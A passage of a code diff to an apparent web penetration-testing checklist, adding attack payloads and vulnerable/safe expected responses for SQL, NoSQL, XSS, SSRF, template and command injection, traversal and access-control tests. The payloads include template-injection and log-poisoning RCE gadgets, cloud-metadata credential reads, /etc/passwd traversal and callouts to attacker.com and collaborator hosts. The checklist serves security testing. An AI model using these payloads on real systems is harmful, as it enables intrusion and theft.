+        payloads: ["curl -b 'session=<tenant_a_token>' https://example.com/api/orgs/2/billing", "curl -b 'session=<tenant_a_token>' -H 'X-Org-Id: 2' https://example.com/api/dashboard"],
+        expectedResponse: {
+          vulnerable: "A user in one tenant/org can access or modify data belonging to another tenant by changing a tenant/org identifier.",
+          safe: "Requests are scoped to the authenticated user's own tenant regardless of identifiers supplied, and cross-tenant access returns 403/404.",
+        },
         severity: "critical",
       },
       {
@@ -884,24 +1426,43 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for privilege escalation via mass assignment",
         how: "Send extra unexpected fields (isAdmin, permissions[]) in a profile-update request that shouldn't be user-settable.",
         payloads: ["{\"isAdmin\":true}"],
+        expectedResponse: {
+          vulnerable: "Sending extra fields (e.g. \"role\":\"admin\", \"isVerified\":true) in a create/update request are silently accepted and applied.",
+          safe: "The server uses an explicit allowlist of updatable fields, ignoring/rejecting unexpected privileged fields.",
+        },
         severity: "critical",
       },
       {
         id: "web-access-priv-5",
         text: "Test missing function-level access control on admin API routes",
         how: "Call admin API endpoints directly with a standard user's token, even if the admin UI is not linked/visible to them.",
+        payloads: ["curl -X POST -b 'session=<standard_user_token>' https://example.com/api/admin/users/124/ban", "curl -X GET -b 'session=<standard_user_token>' https://example.com/api/v1/admin/reports"],
+        expectedResponse: {
+          vulnerable: "Admin API routes are reachable and functional for non-admin authenticated users because only the UI, not the API, hides them.",
+          safe: "Admin API routes independently verify the caller's admin role and reject non-admin requests with 403.",
+        },
         severity: "critical",
       },
       {
         id: "web-access-priv-6",
         text: "Test for privilege escalation via invite/team-member flows",
         how: "Check if an invited member can self-assign a higher role than the inviter granted, by tampering with the invite-accept request.",
+        payloads: ["curl -X POST https://example.com/api/invite/accept -d '{\"token\":\"<invite_token>\",\"role\":\"admin\"}' -H 'Content-Type: application/json'"],
+        expectedResponse: {
+          vulnerable: "An invited/team-member flow allows a lower-role invitee to self-assign or escalate to a higher role during or after acceptance.",
+          safe: "Invite/team flows strictly enforce the role assigned by the inviter and prevent self-escalation.",
+        },
         severity: "high",
       },
       {
         id: "web-access-priv-7",
         text: "Test HTTP verb tampering for access control bypass",
         how: "If GET to an admin endpoint is blocked, try POST/PUT/HEAD/OPTIONS on the same path — some frameworks only guard one verb.",
+        payloads: ["curl -X POST https://example.com/admin/users", "curl -X HEAD https://example.com/admin/users", "curl -X TRACE https://example.com/admin/users", "curl -X GET https://example.com/admin/users -H 'X-HTTP-Method-Override: GET'"],
+        expectedResponse: {
+          vulnerable: "Switching the HTTP verb (e.g. GET to POST, or using PUT/PATCH instead of the restricted method) bypasses an access control check tied to a specific verb.",
+          safe: "Access control is enforced consistently across all HTTP verbs for the same route/resource.",
+        },
         severity: "high",
       },
     ],
@@ -917,12 +1478,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for directory traversal with ../ sequences",
         how: "Inject relative traversal sequences into file-path parameters to escape the intended directory.",
         payloads: ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"],
+        expectedResponse: {
+          vulnerable: "../ sequences in the file parameter successfully retrieve files outside the intended directory (e.g. /etc/passwd contents returned).",
+          safe: "../ sequences are sanitized/normalized and the response stays confined to the intended directory, or returns an error.",
+        },
         severity: "critical",
       },
       {
         id: "web-access-trav-2",
         text: "Check for /proc/self/environ access via traversal (Linux)",
         how: "If traversal is confirmed, attempt to read /proc/self/environ for environment variables including secrets.",
+        payloads: ["../../../../proc/self/environ", "?file=../../../../proc/self/environ"],
+        expectedResponse: {
+          vulnerable: "/proc/self/environ is retrieved via traversal, exposing environment variables (potentially including secrets) of the web server process.",
+          safe: "/proc/self/environ is not accessible; the traversal attempt is blocked or returns an error.",
+        },
         severity: "critical",
       },
       {
@@ -930,6 +1500,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test traversal with encoded/double-encoded payloads",
         how: "Bypass naive filters by URL-encoding or double-encoding the traversal sequence.",
         payloads: ["%252e%252e%252f", "..%c0%af"],
+        expectedResponse: {
+          vulnerable: "Encoded/double-encoded traversal sequences (e.g. %2e%2e%2f, %252e%252e%252f) bypass filtering and reach files outside the intended directory.",
+          safe: "Encoded and double-encoded traversal payloads are decoded and normalized before validation, so the request is still blocked.",
+        },
         severity: "critical",
       },
       {
@@ -937,12 +1511,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test traversal in file-inclusion parameters (LFI)",
         how: "Target parameters that include templates/pages server-side (e.g. ?page=) with traversal payloads to read arbitrary files.",
         payloads: ["?page=../../../../etc/passwd"],
+        expectedResponse: {
+          vulnerable: "A file-inclusion parameter successfully includes and executes/renders an arbitrary local file's contents (LFI).",
+          safe: "The inclusion parameter is restricted to an allowlist of files/paths and arbitrary local file inclusion fails.",
+        },
         severity: "critical",
       },
       {
         id: "web-access-trav-5",
         text: "Test for LFI-to-RCE via log poisoning",
         how: "If LFI is confirmed, inject PHP code into a log file (e.g. via User-Agent) then include that log file to achieve code execution.",
+        payloads: ["curl -A '<?php system($_GET[\"cmd\"]); ?>' https://example.com/", "?page=../../../../var/log/apache2/access.log&cmd=id"],
+        expectedResponse: {
+          vulnerable: "Poisoning a log file with PHP/code via User-Agent then including it via LFI executes arbitrary code.",
+          safe: "Log files are not includable, or injected payloads in logs are not executed when included.",
+        },
         severity: "critical",
       },
       {
@@ -950,12 +1533,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for remote file inclusion (RFI)",
         how: "Try pointing an include parameter at an attacker-controlled remote URL if allow_url_include-style behavior is suspected.",
         payloads: ["?page=http://attacker.com/shell.txt"],
+        expectedResponse: {
+          vulnerable: "A remote URL supplied to the inclusion parameter is fetched and its content is executed/rendered (RFI).",
+          safe: "The inclusion parameter rejects remote URLs (allow_url_include disabled or filtered), so RFI is not possible.",
+        },
         severity: "critical",
       },
       {
         id: "web-access-trav-7",
         text: "Test path traversal on file-serving/static endpoints",
         how: "Check static-file-serving routes (e.g. /static/, /assets/) for traversal outside the intended web root.",
+        payloads: ["curl https://example.com/static/../../../../etc/passwd", "curl https://example.com/assets/..%2f..%2f..%2fetc%2fpasswd"],
+        expectedResponse: {
+          vulnerable: "Traversal sequences on a static/file-serving endpoint retrieve files outside the designated public directory.",
+          safe: "The static file server resolves and confines all paths within its root directory, rejecting any traversal attempt.",
+        },
         severity: "high",
       },
     ],
@@ -973,6 +1565,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test all input fields with a single quote",
         how: "Insert a single quote into every parameter and observe for SQL errors or behavior changes.",
         payloads: ["'"],
+        expectedResponse: {
+          vulnerable: "A single quote in an input field triggers a SQL syntax error or a visibly altered query response, indicating unsanitized input reaches the database.",
+          safe: "The single quote is escaped/parameterized and the app returns a normal response or a generic error with no SQL syntax leakage.",
+        },
         severity: "critical",
       },
       {
@@ -980,6 +1576,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "UNION-based SQLi with column count detection",
         how: "Use ORDER BY to find column count, then UNION SELECT to extract data.",
         payloads: ["' ORDER BY 1--", "' UNION SELECT NULL,NULL--"],
+        expectedResponse: {
+          vulnerable: "A UNION SELECT with the matching column count returns injected data (e.g. version(), extra rows) in the page output.",
+          safe: "UNION-based payloads produce a database error or no extra data appears, confirming input is properly parameterized.",
+        },
         severity: "critical",
       },
       {
@@ -987,6 +1587,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Blind time-based SQLi",
         how: "Inject a payload causing a deliberate DB delay and measure response time to confirm blind injection.",
         payloads: ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"],
+        expectedResponse: {
+          vulnerable: "A time-based payload (e.g. SLEEP(5)) causes a measurable response delay matching the injected sleep duration.",
+          safe: "The response time is unaffected by the injected sleep/delay function regardless of payload.",
+        },
         severity: "critical",
       },
       {
@@ -994,12 +1598,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Boolean-based blind SQLi",
         how: "Send TRUE and FALSE condition payloads and compare response differences (content/length) to extract data bit by bit.",
         payloads: ["' AND 1=1--", "' AND 1=2--"],
+        expectedResponse: {
+          vulnerable: "TRUE and FALSE boolean conditions produce observably different responses (content length, presence of an element), confirming blind SQLi.",
+          safe: "TRUE and FALSE conditions produce identical responses, indicating no boolean-based injection point.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-sqli-5",
         text: "Second-order SQL injection",
         how: "Store a payload via one feature (e.g. profile name) and check if it's later used unsanitized in a different SQL query.",
+        payloads: ["curl -X POST https://example.com/profile -d \"name=admin'--\"", "curl -X POST https://example.com/profile -d \"name=x' OR SLEEP(5)-- -\""],
+        expectedResponse: {
+          vulnerable: "Data stored via one input (e.g. profile name) later triggers a SQLi when used unsanitized in a different query elsewhere in the app.",
+          safe: "Stored data is parameterized wherever it is later used in queries, and no injection occurs downstream.",
+        },
         severity: "critical",
       },
       {
@@ -1007,12 +1620,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test SQLi in ORDER BY / sort parameters",
         how: "Inject into sort/order query parameters, which are often overlooked since they don't hold 'data' values.",
         payloads: ["?sort=name,(SELECT SLEEP(5))"],
+        expectedResponse: {
+          vulnerable: "Injecting SQL into an ORDER BY/sort parameter alters query behavior or throws a SQL error, confirming lack of sanitization in a context that can't use standard parameterization.",
+          safe: "The sort parameter is validated against an allowlist of column names, and injected values are rejected or ignored.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-sqli-7",
         text: "Test SQLi in HTTP headers (User-Agent, X-Forwarded-For)",
         how: "Inject SQLi payloads into logged/processed headers — some apps store or query header values without sanitization.",
+        payloads: ["curl -A \"' OR SLEEP(5)-- -\" https://example.com/", "curl -H \"X-Forwarded-For: 1' AND SLEEP(5)-- -\" https://example.com/"],
+        expectedResponse: {
+          vulnerable: "A SQLi payload placed in User-Agent/X-Forwarded-For is executed by a backend query that logs or processes headers, causing an error or blind response difference.",
+          safe: "Header values are parameterized/sanitized before any database use, so no error or timing difference occurs.",
+        },
         severity: "high",
       },
       {
@@ -1020,6 +1642,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Automate confirmed injection points with sqlmap",
         how: "Once a candidate injection point is found manually, use sqlmap to confirm exploitability and extract data safely within scope.",
         payloads: ["sqlmap -u 'https://example.com/item?id=1' --batch --dbs"],
+        expectedResponse: {
+          vulnerable: "sqlmap confirms and extracts database contents (tables, data) from the identified injection point.",
+          safe: "sqlmap reports no exploitable injection after thorough testing of the identified parameter.",
+        },
         severity: "critical",
       },
       {
@@ -1027,6 +1653,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for WAF-filtered SQLi bypass",
         how: "If a WAF blocks obvious payloads, try case variation, inline comments, or alternate encodings to bypass detection.",
         payloads: ["/*!50000UNION*/ SELECT", "UNI/**/ON SEL/**/ECT"],
+        expectedResponse: {
+          vulnerable: "A WAF-evading payload (case variation, comments, encoding) still reaches the database and triggers injection behavior.",
+          safe: "All bypass variants are still blocked by the WAF or fail to trigger any injection behavior at the application layer.",
+        },
         severity: "critical",
         tags: { relatedItemIds: ["web-waf-1"] },
       },
@@ -1034,6 +1664,11 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-inject-sqli-10",
         text: "Test NoSQL-adjacent ORM injection (Sequelize/TypeORM operators)",
         how: "For apps using an ORM with JSON-based query operators, inject operator objects to bypass intended filters.",
+        payloads: ["{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}", "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}"],
+        expectedResponse: {
+          vulnerable: "ORM operator injection (e.g. Sequelize's $ne/$or via nested objects) alters the query logic, such as bypassing a WHERE clause.",
+          safe: "The ORM strictly types/sanitizes input so operator objects are rejected or treated as literal values, with no logic bypass.",
+        },
         severity: "high",
       },
     ],
@@ -1049,6 +1684,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Reflected XSS in URL parameters",
         how: "Inject a basic script payload into every reflected parameter and check if it executes unescaped.",
         payloads: ["<script>alert(1)</script>", "\"><svg onload=alert(1)>"],
+        expectedResponse: {
+          vulnerable: "The injected <script>/event-handler payload executes in the browser (alert fires) or appears unencoded in the raw HTML response.",
+          safe: "The payload is HTML-entity-encoded or stripped in the response, and no script execution occurs.",
+        },
         severity: "high",
         tags: { relatedItemIds: ["web-inject-xss-2"] },
       },
@@ -1057,6 +1696,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Stored XSS in user-generated content",
         how: "Submit a payload in a field that gets stored (comment, profile bio) and check rendering wherever it's displayed to other users.",
         payloads: ["<img src=x onerror=alert(document.domain)>"],
+        expectedResponse: {
+          vulnerable: "The stored payload executes for any user viewing the content later (alert fires on page load/view), confirming persistent XSS.",
+          safe: "The stored content is sanitized/encoded on output and displays as inert text with no script execution.",
+        },
         severity: "critical",
       },
       {
@@ -1064,6 +1707,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "DOM-based XSS via client-side sinks",
         how: "Trace attacker-controlled input (URL fragment, postMessage) flowing into dangerous sinks like innerHTML/eval/document.write.",
         payloads: ["#<img src=x onerror=alert(1)>"],
+        expectedResponse: {
+          vulnerable: "A client-side sink (innerHTML, document.write, eval) renders attacker-controlled data as executable script/HTML.",
+          safe: "The sink uses safe APIs (textContent, sanitized innerHTML) or the data is sanitized before reaching the sink, and no execution occurs.",
+        },
         severity: "high",
       },
       {
@@ -1071,6 +1718,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "XSS via file upload (SVG/HTML content-type)",
         how: "Upload an SVG or HTML file containing a script payload and check if it's served inline rather than as a download.",
         payloads: ["<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>"],
+        expectedResponse: {
+          vulnerable: "An uploaded SVG/HTML file is served with a rendering content-type and its embedded script executes when viewed/opened.",
+          safe: "Uploaded SVG/HTML is served with Content-Disposition: attachment or a non-executing content-type (e.g. text/plain), preventing script execution.",
+        },
         severity: "high",
       },
       {
@@ -1078,18 +1729,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test XSS filter/encoding bypass with alternate tags",
         how: "If <script> is blocked, try alternate event-handler-based vectors that avoid the filtered pattern.",
         payloads: ["<details open ontoggle=alert(1)>", "<body onload=alert(1)>"],
+        expectedResponse: {
+          vulnerable: "An alternate tag/encoding bypasses the filter and the payload still executes.",
+          safe: "All alternate tag/encoding variants are still neutralized by the filter/encoder, and no execution occurs.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-xss-6",
         text: "Test XSS in JSON responses rendered without escaping",
         how: "Check if API responses (e.g. error messages) reflecting user input are rendered into the DOM without proper encoding.",
+        payloads: ["curl 'https://example.com/api/search?q=<img src=x onerror=alert(1)>'"],
+        expectedResponse: {
+          vulnerable: "JSON-embedded payload data is rendered directly into the DOM without escaping and executes.",
+          safe: "JSON data is escaped/sanitized before being rendered into the DOM, and no execution occurs.",
+        },
         severity: "medium",
       },
       {
         id: "web-inject-xss-7",
         text: "Test mutation XSS (mXSS) via rich text editors",
         how: "Submit HTML that browsers 'mutate' during sanitizer round-tripping, causing a payload that looked safe to become executable.",
+        payloads: ["<listing>&lt;img src=x onerror=alert(1)&gt;</listing>", "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"],
+        expectedResponse: {
+          vulnerable: "The rich text editor's sanitizer fails to catch a mutation-based payload, and the browser's HTML parser mutates it into executable markup.",
+          safe: "The sanitizer runs on the browser-parsed DOM (not raw string) and correctly neutralizes mutation-based payloads.",
+        },
         severity: "high",
       },
       {
@@ -1097,18 +1762,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test XSS via markdown-to-HTML rendering",
         how: "If the app renders user-submitted markdown, check if raw HTML/JS passthrough is allowed by the markdown parser.",
         payloads: ["![x](javascript:alert(1))"],
+        expectedResponse: {
+          vulnerable: "Markdown input containing raw HTML/script is rendered and executes after conversion to HTML.",
+          safe: "The markdown renderer strips/escapes raw HTML and script tags, producing safe output.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-xss-9",
         text: "Test CSP bypass for confirmed XSS",
         how: "If a Content-Security-Policy is present, evaluate it for weaknesses (unsafe-inline, wildcard sources, JSONP endpoints) that let a payload still execute.",
+        payloads: ["<script src=\"https://cdn.example.com/jsonp?callback=alert(1)//\"></script>", "curl -I https://example.com | grep -i content-security-policy"],
+        expectedResponse: {
+          vulnerable: "The confirmed XSS payload still executes despite the CSP (via a weak directive, allowed inline scripts, or a JSONP/allowlisted-domain bypass).",
+          safe: "The CSP blocks the payload from executing (e.g. no unsafe-inline, no bypassable allowlisted domains).",
+        },
         severity: "high",
       },
       {
         id: "web-inject-xss-10",
         text: "Test self-XSS escalation via CSRF chaining",
         how: "If a payload only fires in the attacker's own account (self-XSS), check if it can be chained with a CSRF request to plant it into a victim's session.",
+        payloads: ["<form action=\"https://example.com/profile/update\" method=\"POST\" id=\"f\"><input name=\"bio\" value=\"&lt;img src=x onerror=alert(document.domain)&gt;\"></form><script>document.getElementById('f').submit()</script>"],
+        expectedResponse: {
+          vulnerable: "A CSRF request tricks the victim into submitting the self-XSS payload themselves (e.g. via a forged form auto-submit), turning it into a real, exploitable vulnerability.",
+          safe: "CSRF protections prevent the forged request from being processed, so the self-XSS payload cannot be delivered to another victim.",
+        },
         severity: "medium",
       },
     ],
@@ -1124,6 +1803,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "SSRF via URL-fetching parameters",
         how: "Point any parameter that fetches a remote resource (webhook, PDF generator, image proxy) to an internal address.",
         payloads: ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/"],
+        expectedResponse: {
+          vulnerable: "A URL pointing to an internal address (e.g. http://127.0.0.1 or an internal service) is fetched by the server and its response/content is returned.",
+          safe: "Requests to internal/private IP ranges are blocked or rejected, and only allowlisted external URLs are fetched.",
+        },
         severity: "critical",
       },
       {
@@ -1131,12 +1814,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test SSRF with alternate IP encodings to bypass filters",
         how: "Bypass naive blocklists on '127.0.0.1'/'localhost' using decimal, octal, or short-form IP notation.",
         payloads: ["http://2130706433/", "http://0177.0.0.1/", "http://0x7f000001/"],
+        expectedResponse: {
+          vulnerable: "Alternate IP encodings (decimal, octal, hex, IPv6-mapped) bypass the filter and reach internal resources.",
+          safe: "All alternate encodings are normalized before validation and are still blocked from reaching internal resources.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-ssrf-3",
         text: "Test blind SSRF via out-of-band interaction",
         how: "Point the vulnerable parameter to a Burp Collaborator/interact.sh URL to confirm outbound requests even with no reflected response.",
+        payloads: ["http://<random>.oast.fun", "http://<random>.burpcollaborator.net"],
+        expectedResponse: {
+          vulnerable: "An out-of-band interaction (DNS/HTTP callback to a Burp Collaborator-style listener) is received, confirming the server made the outbound request even with no visible response.",
+          safe: "No out-of-band interaction is received, confirming the server does not make outbound requests to attacker-controlled hosts.",
+        },
         severity: "high",
       },
       {
@@ -1144,30 +1836,54 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test SSRF to cloud metadata endpoints",
         how: "Target the cloud provider's metadata service to attempt credential theft from the running instance.",
         payloads: ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+        expectedResponse: {
+          vulnerable: "The cloud metadata endpoint (e.g. 169.254.169.254) is reached and returns instance credentials/metadata.",
+          safe: "Requests to the metadata endpoint are blocked, or the response requires an unforgeable token (IMDSv2) that the attacker cannot supply.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-ssrf-5",
         text: "Test SSRF via redirect-following requests",
         how: "Host a URL that redirects to an internal address — some SSRF filters only validate the initial URL, not redirect targets.",
+        payloads: ["http://attacker.com/redirect-to-internal  # 302 Location: http://169.254.169.254/latest/meta-data/"],
+        expectedResponse: {
+          vulnerable: "A redirect from an allowlisted URL to an internal address is followed by the server, reaching internal resources.",
+          safe: "The server does not follow redirects, or re-validates the destination against the allowlist after each redirect.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-ssrf-6",
         text: "Test SSRF in webhook/callback URL configuration",
         how: "If the app lets users configure a webhook/callback URL, point it at internal services to probe the internal network.",
+        payloads: ["curl -X POST https://example.com/api/webhooks -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'", "curl -X POST https://example.com/api/webhooks -d '{\"url\":\"http://internal-service.local:8080/admin\"}'"],
+        expectedResponse: {
+          vulnerable: "A webhook/callback URL pointing to an internal address is accepted and the server sends the callback request to it.",
+          safe: "Webhook URLs are validated against a public-IP-only allowlist and internal targets are rejected.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-ssrf-7",
         text: "Test SSRF via DNS rebinding",
         how: "Use a domain that resolves to a public IP on first check then rebinds to an internal IP on the actual fetch, bypassing TOCTOU validation.",
+        payloads: ["http://make-<attacker>.rbndr.us/  # alternates between public IP and 127.0.0.1", "http://1time.127.0.0.1.forever.rebind.network/"],
+        expectedResponse: {
+          vulnerable: "A domain that resolves to a public IP at validation time but an internal IP at request time (DNS rebinding) causes the server to fetch the internal resource.",
+          safe: "The server re-validates or pins the resolved IP at request time, preventing DNS rebinding from reaching internal resources.",
+        },
         severity: "high",
       },
       {
         id: "web-inject-ssrf-8",
         text: "Test SSRF through file-parsing features (XML, PDF, image)",
         how: "Check if PDF generators or image processors follow external references embedded in the uploaded file (e.g. XXE-style SSRF).",
+        payloads: ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>", "<img src='http://169.254.169.254/latest/meta-data/' width='1'/>  # embedded in HTML-to-PDF conversion"],
+        expectedResponse: {
+          vulnerable: "A crafted XML/PDF/image file causes the parser to make an outbound request to an attacker-controlled or internal URL during processing.",
+          safe: "The file parser disables external resource fetching/entity resolution, so no outbound request is triggered during processing.",
+        },
         severity: "high",
         tags: { relatedItemIds: ["web-inject-xxe-1"] },
       },
@@ -1184,6 +1900,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test for SSTI with basic math expression",
         how: "Inject a template expression into user-controlled input rendered server-side and check if it's evaluated.",
         payloads: ["{{7*7}}", "${7*7}", "#{7*7}"],
+        expectedResponse: {
+          vulnerable: "A math expression like {{7*7}} renders as \"49\" in the output, confirming server-side template evaluation of user input.",
+          safe: "The expression is rendered literally as text (e.g. \"{{7*7}}\") with no evaluation.",
+        },
         severity: "critical",
       },
       {
@@ -1191,6 +1911,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Identify template engine via polyglot payload",
         how: "Send a payload that behaves differently across engines to fingerprint which one is in use before crafting an RCE payload.",
         payloads: ["${{<%[%'\"}}%\\."],
+        expectedResponse: {
+          vulnerable: "A polyglot payload's output pattern matches a specific template engine's syntax evaluation, identifying the exact engine in use.",
+          safe: "The polyglot payload is rendered as literal text with no engine-specific evaluation, so no engine can be fingerprinted this way.",
+        },
         severity: "info",
       },
       {
@@ -1198,18 +1922,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test Jinja2 SSTI to RCE (Python Flask/Django)",
         how: "Escalate a confirmed Jinja2 SSTI to remote code execution via the object class hierarchy.",
         payloads: ["{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"],
+        expectedResponse: {
+          vulnerable: "A Jinja2 payload (e.g. using __class__.__mro__ gadget chains) achieves remote code execution, with command output reflected in the response.",
+          safe: "Jinja2 payloads are rendered as inert text, or the environment uses a sandboxed context that blocks attribute/gadget access.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-ssti-4",
         text: "Test Twig/Freemarker SSTI to RCE (PHP/Java)",
         how: "Adapt the confirmed engine's known RCE gadget to achieve command execution once template evaluation is confirmed.",
+        payloads: ["{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"],
+        expectedResponse: {
+          vulnerable: "A Twig/Freemarker RCE payload executes and returns command output in the response.",
+          safe: "The payload is rendered as literal text or the template engine's sandbox blocks execution of the injected expression.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-ssti-5",
         text: "Test SSTI in email/notification template rendering",
         how: "Check less-obvious rendering paths (transactional email templates, PDF generation) for the same template injection.",
+        payloads: ["curl -X POST https://example.com/api/profile -d 'displayName={{7*7}}' # then trigger a notification email"],
+        expectedResponse: {
+          vulnerable: "A template expression injected into an email/notification body is evaluated server-side when the notification is generated.",
+          safe: "Template expressions in notification content are rendered as literal text, with no server-side evaluation.",
+        },
         severity: "critical",
       },
     ],
@@ -1225,6 +1963,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test command injection with semicolons",
         how: "Append shell metacharacters to parameters that may reach a system call, and observe output/behavior change.",
         payloads: ["; id", "| id", "&& id"],
+        expectedResponse: {
+          vulnerable: "A semicolon-chained command (e.g. \"; id\") executes and its output appears in the response.",
+          safe: "Semicolons and shell metacharacters are stripped/escaped, or the input is passed to exec without a shell, so no extra command executes.",
+        },
         severity: "critical",
       },
       {
@@ -1232,6 +1974,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test blind command injection with time delays",
         how: "Inject a sleep command and measure response time to confirm execution without visible output.",
         payloads: ["; sleep 5", "| ping -c 5 127.0.0.1"],
+        expectedResponse: {
+          vulnerable: "A time-delay payload (e.g. \"; sleep 10\") causes a matching response delay, confirming blind command execution.",
+          safe: "The response time is unaffected by the injected delay command, indicating no command execution occurs.",
+        },
         severity: "critical",
       },
       {
@@ -1239,6 +1985,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test out-of-band command injection confirmation",
         how: "Inject a command that triggers a DNS/HTTP callback to your listener, confirming execution even with no output or delay.",
         payloads: ["; curl http://<collaborator>/"],
+        expectedResponse: {
+          vulnerable: "An out-of-band callback (DNS/HTTP) triggered by the injected command is received, confirming execution with no direct response indicator.",
+          safe: "No out-of-band callback is received, confirming the injected command did not execute.",
+        },
         severity: "critical",
       },
       {
@@ -1246,6 +1996,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test command injection via file names in upload processing",
         how: "If uploaded filenames are passed to shell commands (e.g. image conversion), craft a filename with embedded shell metacharacters.",
         payloads: ["image.jpg; touch pwned.txt"],
+        expectedResponse: {
+          vulnerable: "A malicious filename (e.g. containing backticks or `; rm -rf`) is passed unsanitized to a shell command during upload processing and executes.",
+          safe: "Filenames are sanitized/escaped or processing avoids shell invocation entirely, so injected filename content has no effect.",
+        },
         severity: "critical",
       },
       {
@@ -1253,12 +2007,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test command injection filter bypass",
         how: "If spaces/semicolons are filtered, try alternate separators and whitespace substitutes.",
         payloads: ["${IFS}", "%09", "$()"],
+        expectedResponse: {
+          vulnerable: "A filter-bypass technique (e.g. using $IFS instead of spaces, or alternate encodings) still results in command execution.",
+          safe: "All bypass variants are blocked or fail to execute, indicating robust sanitization/allowlisting rather than blacklist filtering.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-cmd-6",
         text: "Test argument injection (not full command injection)",
         how: "If input is passed as an argument to a fixed binary, check if extra flags can be injected to change behavior (e.g. --output overwriting arbitrary files).",
+        payloads: ["--output=/var/www/html/shell.php", "-oProxyCommand=some-command"],
+        expectedResponse: {
+          vulnerable: "Injected arguments (e.g. an extra flag like --output=/var/www/shell.php) change a legitimate command's behavior in an exploitable way, even without chaining a new command.",
+          safe: "Arguments are validated/allowlisted and cannot be manipulated to alter the invoked command's behavior.",
+        },
         severity: "high",
       },
     ],
@@ -1274,6 +2037,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test MongoDB injection with operator objects",
         how: "Replace a plain string field with a MongoDB operator object in the JSON body to alter query logic.",
         payloads: ["{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"],
+        expectedResponse: {
+          vulnerable: "A MongoDB operator object (e.g. {\"$ne\": null} or {\"$gt\": \"\"}) alters the query logic, such as returning unintended records.",
+          safe: "Operator objects supplied by the client are rejected or coerced to string literals, with no change to query logic.",
+        },
         severity: "critical",
       },
       {
@@ -1281,12 +2048,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test NoSQLi authentication bypass",
         how: "Attempt login using $gt/$ne/$regex operators in place of the expected password value.",
         payloads: ["password[$ne]=1", "password[$regex]=^a"],
+        expectedResponse: {
+          vulnerable: "Supplying {\"$ne\": \"\"} for password bypasses authentication and logs in without valid credentials.",
+          safe: "The login query strictly types/validates input, and operator-based payloads fail to authenticate.",
+        },
         severity: "critical",
       },
       {
         id: "web-inject-nosql-3",
         text: "Test blind NoSQL injection via regex timing",
         how: "Use $regex with intentionally expensive patterns to extract data character-by-character based on response timing.",
+        payloads: ["{\"username\":\"admin\",\"password\":{\"$regex\":\"^a.*\"}}", "{\"username\":\"admin\",\"password\":{\"$regex\":\"^(?!a).*\"}}"],
+        expectedResponse: {
+          vulnerable: "Response timing differs based on injected regex conditions, allowing blind data extraction character by character.",
+          safe: "Response timing is unaffected by injected regex payloads, indicating no blind NoSQL injection point.",
+        },
         severity: "high",
       },
       {
@@ -1294,6 +2070,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test NoSQLi in URL-encoded form vs JSON body",
         how: "Some frameworks parse array-style form params into operator objects — test both content types for the same injection.",
         payloads: ["username[$ne]=foo"],
+        expectedResponse: {
+          vulnerable: "The injection payload succeeds via one content-type (e.g. JSON body) even though it's blocked via the other (e.g. URL-encoded form), showing inconsistent input handling.",
+          safe: "Both URL-encoded and JSON request bodies are validated identically, with operator injection blocked in both.",
+        },
         severity: "high",
       },
       {
@@ -1301,12 +2081,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Test server-side JavaScript injection ($where in MongoDB)",
         how: "If $where clauses are accepted, attempt to inject arbitrary JS for data extraction or DoS.",
         payloads: ["\"$where\": \"sleep(5000)\""],
+        expectedResponse: {
